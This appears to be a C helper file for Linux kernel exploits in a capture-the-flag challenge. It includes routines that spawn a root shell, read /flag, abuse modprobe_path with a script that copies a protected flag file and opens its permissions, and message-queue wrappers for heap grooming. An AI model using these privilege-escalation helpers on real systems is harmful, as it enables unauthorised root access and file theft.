#include <stdio.h>
#include <stdlib.h>

typedef unsigned long ulong;
typedef unsigned int uint;
typedef unsigned short ushort;
typedef unsigned char uchar;

#define PAGE_SIZE 0x1000

#define WAIT getchar()

void debug() 
{
    puts("[!] Pause for debugging!");
    getchar();
}

void panic(const char *msg)
{
    puts(msg);
    exit(-1);
}

void dump_output(unsigned long *buff, unsigned long size)
{
    int i,j;

    for (i = 0; i < size/8; i++)
    {
        if ((i % 2) == 0)
        {
            if (i != 0)
                printf("  \n");

            printf("  %04x  ", i*8);
        }

        unsigned long ptr = ((unsigned long *)(buff))[i];
        printf("0x%016lx", ptr);
        printf("    ");
    }
    printf("\n");
}

void read_flag(void) 
{
    puts("[*] return to userland, calling read_flag()");
    char flag[100];
    read(open("/flag", O_RDONLY), flag, 100);
    puts(flag);
}

void get_shell(void) 
{
    puts("[*] return to userland, calling get_shell()");
    system("/bin/sh");
}

// might need to modify depend on challenge environment
void prepare_modprobe_path(void)
{
    puts("[*] prepare modprobe path");

    system("echo -ne '#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag\n/bin/chmod 777 /home/ctf/flag' > /home/ctf/copy.sh");
    system("chmod +x /home/ctf/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/dummy");
    system("chmod +x /home/ctf/dummy");

}

void trigger_modprobe_path(void)
{
    puts("[*] Trigger modprobe_path script!");
    system("/home/ctf/dummy");
}

unsigned long bswap(unsigned long val) 
{
    asm(
        "bswap %1;"
        : "=r" (val)
        : "r" (val));
}

int open_dev(const char *device_path) 
{
    int fd;
    fd = open(device_path, O_RDONLY);
    if (fd < 0) {
        panic("[!] Error when opening device!");
    } else {
        puts("[*] Opened device!");
    }    

    return fd;
}

void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
    {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

int32_t make_queue(key_t key, int msgflg)
{
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}
